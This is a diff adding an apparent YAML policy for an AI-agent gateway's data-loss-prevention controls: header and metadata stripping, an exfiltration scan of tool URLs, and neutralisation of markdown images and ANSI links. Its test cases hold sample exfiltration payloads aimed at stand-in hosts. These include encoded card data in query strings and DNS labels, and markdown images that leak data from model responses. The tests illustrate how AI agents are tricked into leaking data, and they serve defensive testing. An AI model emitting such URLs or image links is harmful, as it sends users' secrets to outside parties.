@@ -1,0 +1,132 @@
+# metadata-egress: DLP-03 / DLP-04 / DLP-06. policy-engine merges into config/policy.yaml.
+# Omitted params follow the active profile (see "Profile defaults" at the bottom); set a key to pin it.
+#
+# Policy keys these controls also READ (owned by policy-engine, shown here for reference):
+#   destinations.matrix.INTERNAL       DLP-03 text gate per destination (allow|log|redact|block)
+#   destinations.internal_domains      DLP-03 hostnames + /egress destination class (local)
+#   destinations.allowed_link_domains  DLP-06 allowed image/link hosts (needs docs.acme-capital.example,
+#                                      assets.acme-capital.example, assets.aegis-corp.example [SF-06])
+#   destinations.egress_allowlist      DLP-04 scope: non-empty => every other host scores 1.0
+#   approvals.defaults.hold_s.egress   /egress approval hold (default 15 s)
+#   defaults.max_body_bytes            /egress request size cap
+controls:
+  - id: DLP-03
+    name: Metadata stripping & generalization
+    action: redact
+    severity: medium
+    fail_mode: open            # strict/paranoid profile: closed
+    timeout_ms: 1000           # text-only ~2-5 ms; budget covers attachment sanitizing
+    owasp: [LLM02:2026, LLM08:2026, MCP10:2025]
+    params:
+      headers:
+        deny: [x-forwarded-for, x-forwarded-host, x-forwarded-proto, x-real-ip, forwarded, via,
+               true-client-ip, cf-connecting-ip, x-client-ip, cookie, referer, origin,
+               "x-stainless-*", "x-client-*", "x-internal-*", x-amzn-trace-id]
+        allow:                 # protected in denylist mode; the only survivors in allowlist mode
+          anthropic: ["anthropic-*", authorization, x-api-key, content-type, accept, user-agent, x-app, x-claude-code-session-id]
+          openai:    ["openai-*", authorization, content-type, accept, user-agent]
+          ollama:    [content-type, accept]
+          mcp:       ["mcp-*", content-type, accept, last-event-id]
+          egress:    [accept, accept-language, content-type, if-match, if-none-match, idempotency-key, user-agent]
+        replace: {user-agent: "aegis/0.1"}
+        keep_user_agent_for: [anthropic]     # Claude Code OAuth traffic keeps its UA
+        pass_auth_hosts: []                  # /egress hosts allowed to receive agent-supplied credentials
+      body_fields:
+        - {path: metadata.user_id, op: pseudonymize}
+        - {path: user, op: pseudonymize}
+        - {path: safety_identifier, op: pseudonymize}
+      media: {images: strip, pdf: strip, office: strip, max_bytes: 10000000, generic_base64_min_len: 1024}
+      # Legacy staging keys `strip_body_fields` / `generalize` (docs/seed-fixes/policy.yaml) are accepted:
+      #   strip_body_fields -> body_fields (pseudonymize) when body_fields is absent; generalize.<x>: false disables x.
+      # exempt_agents: ["claude-code@*"]   # emergency switch: skip text generalization for these agents
+      # profile-sensitive (omitted): text.{enabled,paths,hostnames,private_ips,mac_addresses,git,learn_identifiers,style},
+      #   headers.mode, claude_code.{enabled,user_email,git_user,git_status,project_claude_md,user_claude_md,
+      #   environment,pseudonymize_session_id}, media.unsupported
+    tests:
+      - {name: paths-hosts-ips-to-remote, control: DLP-03, expect: redact, kind: model_call, surface: model.request,
+         destination: remote, text: "Traceback in /Users/jdoe/acme-internal/trading/pnl.py on host jdoe-mbp.corp.local (10.20.30.40)"}
+      - {name: same-trace-to-local, expect: allow, kind: model_call, surface: model.request, destination: local,
+         text: "Traceback in /Users/jdoe/acme-internal/trading/pnl.py on host jdoe-mbp.corp.local"}
+      - {name: clean-prompt-untouched, expect: allow, kind: model_call, surface: model.request, destination: remote,
+         text: "What is the P/E ratio of a bank?"}
+      - {name: shared-path-not-a-user, expect: allow, kind: model_call, surface: model.request, destination: remote,
+         text: "Copy the export to /Users/Shared/reports/q3.csv"}
+      # Addendum A-30 extras: `headers` / `raw` feed Interaction.headers / Interaction.raw
+      - {name: client-headers-stripped, control: DLP-03, expect: redact, kind: model_call, surface: model.request, destination: remote,
+         text: "What is the P/E ratio of a bank?",
+         headers: {x-forwarded-for: "10.1.2.3", x-stainless-os: MacOS, anthropic-version: "2023-06-01"}}
+      - {name: claude-code-user-id-pseudonymized, control: DLP-03, expect: redact, kind: model_call, surface: model.request, destination: remote,
+         text: "What is the P/E ratio of a bank?",
+         raw: {metadata: {user_id: '{"device_id":"5f0c1d2e3a4b5c6d","account_uuid":"a1b2c3d4-0000-4000-8000-00000000cafe","session_id":"5e551011-0000-4000-8000-0000000000aa"}'}}}
+
+  - id: DLP-04
+    name: Tool-arg / egress exfiltration scan
+    action: block
+    threshold: 0.8             # heuristic score -> action; decoded secrets/PII, OAST hosts, allow-list misses score 1.0
+    severity: high
+    fail_mode: closed
+    timeout_ms: 300
+    owasp: [LLM02:2026, MCP10:2025, ASI02, ASI01]
+    params:
+      max_encoded_len: 64
+      url_encoded_min_len: 16
+      decode_depth: 2
+      query_max_len: 256
+      dns_label_max: 40
+      dns_label_entropy_min: 3.5
+      dns_max_labels: 8
+      blob_entropy_min: 4.0
+      exfil_hosts_extra: []    # live twist: add "exfil.test"
+      trusted_params: ["X-Amz-*", sig, signature, state, code_challenge]
+      scan_local_tool_urls: true
+      semantic_judge: false
+    tests:
+      - {name: b64-pan-in-query, expect: block, kind: tool_call, surface: tool.input, destination: third_party,
+         tool_name: WebFetch, tool_args: {url: "https://collect.example.net/c?d=NDExMSAxMTExIDExMTEgMTExMQ==", prompt: "summarize"}}
+      - {name: dns-label-base32-pesel, control: DLP-04, expect: block, kind: tool_call, surface: tool.input, destination: third_party,
+         tool_name: WebFetch, tool_args: {url: "https://kbcvgrkmea2dimbvge2damjtgu4q.dns.collect.example.net/", prompt: "ping"}}
+      - {name: oast-host, control: DLP-04, expect: block, kind: tool_call, surface: tool.input, destination: third_party,
+         tool_name: WebFetch, tool_args: {url: "https://c3f1a9.oast.fun/x", prompt: "ping"}}
+      - {name: userinfo-host-confusion, control: DLP-04, expect: block, kind: egress, surface: egress.request, destination: third_party,
+         tool_name: http.get, tool_args: {method: GET, url: "https://api.marketpulse.example@collect.example.net/q"}}
+      - {name: normal-quote, expect: allow, kind: tool_call, surface: tool.input, destination: third_party,
+         tool_name: WebFetch, tool_args: {url: "https://api.marketpulse.example/v1/quote?ticker=PKO", prompt: "price?"}}
+      - {name: normal-search, expect: allow, kind: tool_call, surface: tool.input, destination: third_party,
+         tool_name: WebSearch, tool_args: {query: "weather Kraków tomorrow"}}
+
+  - id: DLP-06
+    name: Exfil-channel neutralization (md images/links, ANSI)
+    action: redact
+    severity: high
+    fail_mode: closed
+    timeout_ms: 100
+    owasp: [LLM10:2026, LLM02:2026, ASI01]
+    params:
+      max_query_len: 64
+      reference_style: true
+      strip_html_tags: [img, iframe, script, object, embed, meta, link, form, base]
+      strip_ansi: true
+      extra_allowed_domains: []
+      # profile-sensitive (omitted): strip_images (external|all|none), defang_links (suspicious|all_external|none)
+    tests:
+      - {name: echoleak-image, control: DLP-06, expect: redact, kind: model_call, surface: model.response, destination: remote,
+         text: "Here is your chart ![x](https://exfil.test/p.png?d=c2VjcmV0LXEzLXJldmVudWU)"}
+      - {name: reference-style-image, control: DLP-06, expect: redact, kind: model_call, surface: model.response, destination: remote,
+         text: "Summary complete. ![a][ref]\n\n[ref]: https://exfil.test/collect?d=Q3-revenue-and-client-list"}
+      - {name: ansi-osc8-link, control: DLP-06, expect: redact, kind: tool_call, surface: tool.output, destination: remote,
+         text: "\e]8;;https://evil.example/x\e\\click here\e]8;;\e\\"}
+      - {name: allowlisted-chart, expect: allow, kind: model_call, surface: model.response, destination: remote,
+         text: "![chart](https://docs.acme-capital.example/charts/pnl.png)"}
+      - {name: plain-doc-link, expect: allow, kind: model_call, surface: model.response, destination: remote,
+         text: "See https://www.python.org/downloads/ for installers."}
+      - {name: allowlisted-asset-image-kept, control: DLP-06, expect: allow, surface: model.response, destination: remote,   # [SF-06]
+         text: "![logo](https://assets.acme-capital.example/static/logo.png)"}
+
+# Profile defaults implemented in aegis/egress/params.py (PROFILE_DEFAULTS; agent `profile` overrides policy `profile`):
+#   permissive: DLP-03 text.* off, claude_code off (headers + body fields + media only), media.unsupported allow;
+#               DLP-04 threshold 0.95 (when `threshold` unset); DLP-06 strip_images external, defang_links none
+#   balanced:   DLP-03 text paths/hostnames/private_ips on, git off, headers.mode denylist, claude_code user_email+git_user,
+#               style {remote: placeholder, third_party: generalize}, media.unsupported block; DLP-04 0.8; DLP-06 external/suspicious
+#   strict:     DLP-03 fail_mode closed, text.git on, headers.mode allowlist, claude_code git_status/user_claude_md strip,
+#               pseudonymize_session_id; DLP-04 threshold 0.6; DLP-06 defang_links all_external
+#   paranoid:   strict + claude_code environment generalize + project_claude_md strip; DLP-04 0.5; DLP-06 strip_images all
